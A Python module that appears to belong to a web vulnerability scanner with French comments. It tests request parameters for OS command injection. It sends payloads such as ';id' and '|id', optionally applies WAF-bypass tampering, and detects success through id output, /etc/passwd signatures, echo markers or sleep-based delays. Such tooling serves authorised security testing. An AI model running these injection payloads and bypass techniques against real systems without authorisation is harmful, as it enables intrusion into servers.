import time
import re
from .tampering import apply_tampering
from . import bypass_oracle

CMDI_SIGS = [
    r"uid=\d+\(.*\)",
    r"gid=\d+\(.*\)",
    r"root:x:0:0:",
    r"\[extensions\]",
    r"Windows IP Configuration",
    r"www-data",
    r"apache",
]

ECHO_MARKER = "WAFMAP_CMDI_SUCCESS"


def load_payloads():
    try:
        with open("payloads/cmdi.txt", "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return [";id", "|id", f";echo {ECHO_MARKER}"]


def run_cmdi_test(engine, point, param, level, bypass, waf_name=None):
    url = point['url']
    method = point['method']

    defaults = point.get('defaults', {})
    original_value = defaults.get(param, "")

    csrf_token_data = {}
    if method == 'POST' and hasattr(engine, 'csrf_token') and isinstance(engine.csrf_token, dict):
        csrf_token_data = engine.csrf_token

    payloads = load_payloads()

    start = time.time()
    base_data = defaults.copy()
    if method == 'POST':
        base_data.update(csrf_token_data)
    base_params = defaults.copy() if method == 'GET' else None

    engine._send_request(url, method=method, data=base_data, params=base_params)
    baseline = time.time() - start

    oracle_base = base_data if method == 'POST' else base_params

    forced_technique = None
    if bypass:
        forced_technique = bypass_oracle.probe_and_get_technique(engine, url, method, oracle_base, param, 'cmdi', waf_name)

    for pay in payloads:
        if engine.is_vector_confirmed('CMDi', url, param):
            return

        current_payloads = [pay]
        if original_value and original_value != 'test':
            current_payloads.append(f"{original_value}{pay}")

        for current_pay in current_payloads:
            final_pay = apply_tampering(current_pay, 'cmdi', bypass, waf_name, technique=forced_technique)

            if method == 'POST':
                data = defaults.copy()
                data.update(csrf_token_data)
                params = None
            else:
                params = defaults.copy()
                data = None

            t0 = time.time()
            if bypass:
                base_for_raw = data if method == 'POST' else params
                resp = engine._send_request_raw(url, method, base_for_raw, param, final_pay)
            else:
                if method == 'POST':
                    data[param] = final_pay
                else:
                    params[param] = final_pay
                resp = engine._send_request(url, method=method, data=data, params=params)
            duration = time.time() - t0

            if resp is not None:
                if ECHO_MARKER in resp.text:
                    details = f"Serveur a renvoyé la chaîne témoin '{ECHO_MARKER}'"
                    if bypass and forced_technique:
                        details += f" - Technique de bypass utilisée : {forced_technique}"
                    engine.add_vulnerability("CMDi (Echo)", url, final_pay, details, parameter=param)
                    return

                for sig in CMDI_SIGS:
                    if re.search(sig, resp.text, re.IGNORECASE | re.DOTALL):
                        details = f"Commande exécutée (Regex: {sig})"
                        if bypass and forced_technique:
                            details += f" - Technique de bypass utilisée : {forced_technique}"
                        engine.add_vulnerability("CMDi (Output)", url, final_pay, details, parameter=param)
                        return

                if "sleep" in pay or "timeout" in pay:
                    if duration > (baseline + 4):
                        t0b = time.time()
                        if bypass:
                            engine._send_request_raw(url, method, base_for_raw, param, final_pay)
                        else:
                            engine._send_request(url, method=method, data=data, params=params)
                        confirm_duration = time.time() - t0b

                        if confirm_duration > (baseline + 4):
                            engine.add_vulnerability(
                                "CMDi (Time-Based)", url, final_pay,
                                f"Délai reproduit deux fois : {duration:.2f}s puis {confirm_duration:.2f}s "
                                f"(baseline {baseline:.2f}s).",
                                parameter=param,
                                confidence="Confirmée"
                            )
                            return
                        engine.add_vulnerability(
                            "CMDi (Time-Based, non reproduit)", url, final_pay,
                            f"Délai de {duration:.2f}s non reproduit ({confirm_duration:.2f}s) : à revérifier.",
                            parameter=param,
                            confidence="A vérifier"
                        )
                        return
